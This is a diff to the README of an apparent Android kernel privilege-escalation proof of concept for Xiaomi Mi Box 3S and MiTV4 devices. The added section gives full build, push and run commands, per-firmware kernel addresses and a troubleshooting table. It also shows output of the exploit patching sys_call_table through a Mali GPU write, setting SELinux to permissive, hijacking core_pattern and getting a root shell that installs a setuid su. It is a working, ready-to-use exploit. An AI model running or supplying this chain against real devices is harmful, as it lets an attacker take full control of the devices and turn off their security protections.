@@ -367,27 +367,100 @@ An alternative that avoids `core_pattern` (also verified): point the slots at
 
 ## 8. Build and run
 
-```sh
-# Mi Box 3S target: aarch64 helpers (gpwrite avoids the broken /dev/ion mmap)
-make                     # gpwrite64, kfunc_new, kread, crash_for_core
-# or, with zig as the cross compiler:
-make zig
-# the upstream 32-bit helpers, for MiTV4 / reference:
-make gpu_arb_write gpu_scan
+### 8.1 Prerequisites
 
+- `adb` with the box authorised — `adb devices` must list it. Everything below runs
+  as an ordinary `adb shell` (uid 2000); **root is the result, not a requirement**.
+- One cross toolchain: `aarch64-linux-gnu-gcc` + `arm-linux-gnueabihf-gcc`, **or**
+  [zig](https://ziglang.org), where `make zig` needs no sysroot and no gcc.
+- Nothing installed on the device: the helpers are statically linked and run under
+  `/system/bin/sh`.
+
+### 8.2 Build
+
+```sh
+make                          # Mi Box 3S chain: gpwrite64 kfunc_new kread crash_for_core
+make zig                      # same, with zig as the cross compiler
+make gpu_arb_write gpu_scan   # upstream 32-bit helpers (MiTV4 path / reference)
+```
+
+`kfunc_new` **must** be aarch64: a 32-bit caller is dispatched through
+`compat_sys_call_table` in `.text` and can never hit the table this exploit patches
+(§5.2). `gpwrite64` is aarch64 for the same reason — the write itself is
+bitness-agnostic, the probes it does are not.
+
+### 8.3 Push
+
+```sh
+make install
+```
+
+or by hand:
+
+```sh
 adb push gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh /data/local/tmp/
-adb shell 'cd /data/local/tmp && chmod 755 gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh && ./run.sh'
+adb shell 'cd /data/local/tmp && chmod 755 gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh'
 ```
 
-`run.sh` accepts two overrides if your firmware differs:
+### 8.4 Verify the primitive before touching the table
 
 ```sh
-KLN_ADDR=ffffffc00...   # kallsyms_lookup_name on your kernel
-SLOT_PHYS=1ee77a0       # physical address of sys_call_table[244] (Mi Box 3S 8.2.2.817)
+adb shell /data/local/tmp/gpwrite64 place 0
+# [*] test page phys=0x47e5d000 +0x0
+# [*] changed [0x0..0x7f] count=128 PLACEMENT OK
 ```
 
-Recovering both on an unknown firmware is the only part this PoC does not
-automate; see §10.
+`PLACEMENT OK` means one 128-byte GPU write really landed where `pagemap` said that
+page is. On `MISMATCH` or `count=0`, stop — the primitive is not working and every
+later step would be writing garbage into kernel memory (§4).
+
+### 8.5 Run
+
+```sh
+adb shell /data/local/tmp/run.sh
+```
+
+```
+[run] stage 0: sys_call_table[244..259] <- kallsyms_lookup_name
+[run] memcpy            = 0xffffffc0013e1270
+[run] selinux_enforcing = 0xffffffc0020cff24
+[run] core_pattern      = 0xffffffc001f1c0c8
+[run] stage 2: sys_call_table[244..259] <- memcpy
+[run] stage 3: selinux_enforcing = 0
+[run] getenforce -> Permissive
+[run] stage 4: core_pattern <- |/data/local/tmp/roothelper.sh
+[run] stage 5: triggering coredump
+[run] success - helper ran as root:
+    uid=0(root) gid=0(root) ... context=u:r:kernel:s0
+```
+
+`roothelper.sh` writes its own output to `/data/local/tmp/root.log` and, if
+`/data/local/tmp/su` is present, installs it as a setuid `su` (§7).
+
+### 8.6 A different firmware
+
+Only two constants are build-specific; everything else is resolved at run time:
+
+```sh
+KLN_ADDR=ffffffc00111e5a0 SLOT_PHYS=1eaf7a0 adb shell /data/local/tmp/run.sh
+```
+
+| build | `SLOT_PHYS` | `KLN_ADDR` |
+|---|---|---|
+| `8.2.2.817` — what `run.sh` ships | `1ee77a0` | `ffffffc00111e5d0` |
+| `6.8.22.145` | `1eaf7a0` | `ffffffc00111e5a0` |
+
+Recovering both on an unknown build — including one where you have no root at all —
+is in §10 and [FINDING_ADDRESSES.md](FINDING_ADDRESSES.md).
+
+### 8.7 When it fails
+
+| symptom | cause |
+|---|---|
+| `place` prints `MISMATCH` or `count=0` | the write is not landing: `/dev/mali` must be `0666`, and this unit needs the `pixel_format` from §4.1 |
+| `cannot resolve memcpy (slot wrong?)` | `SLOT_PHYS` is not `sys_call_table[244]` on this build |
+| instant reboot / black screen | kernel oops with `panic_on_oops=1`. A wrong address **faults**, it does not fail softly — verify offline first (§10) |
+| `gpwrite64 missing (build: make gpwrite64)` | pushed without `chmod 755`, or the binary is the wrong architecture |
 
 ---
 
